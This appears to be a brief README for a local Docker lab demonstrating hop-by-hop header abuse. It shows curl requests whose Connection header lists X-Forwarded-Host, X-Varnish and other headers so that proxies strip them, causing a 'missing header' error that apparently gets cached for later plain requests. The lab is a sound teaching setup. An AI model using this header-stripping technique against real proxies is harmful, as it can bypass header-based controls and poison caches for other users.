# abusing-hop-by-hop-header

# run

```shell
$ docker-compose run
```

# abusing

```shell
❯ curl 'http://localhost/?p=1'
[["Host", "app:3000"], ["User-Agent", "curl/7.54.0"], ["Accept", "*/*"], ["X-Forwarded-For", "172.21.0.1, 172.21.0.4"], ["Xxx", "yyy"], ["Accept-Encoding", "gzip"], ["X-Varnish", "3"], ["X-Forwarded-Host", "localhost"], ["X-Forwarded-Server", "172.21.0.3"], ["Connection", "Keep-Alive"]] 

❯ curl 'http://localhost/?p=2' -H 'Connection: keep-alive, X-Forwarded-Host, X-Forwarded-Server, X-Varnish, xxx'
missing header

❯ curl 'http://localhost/?p=2'
missing header
```
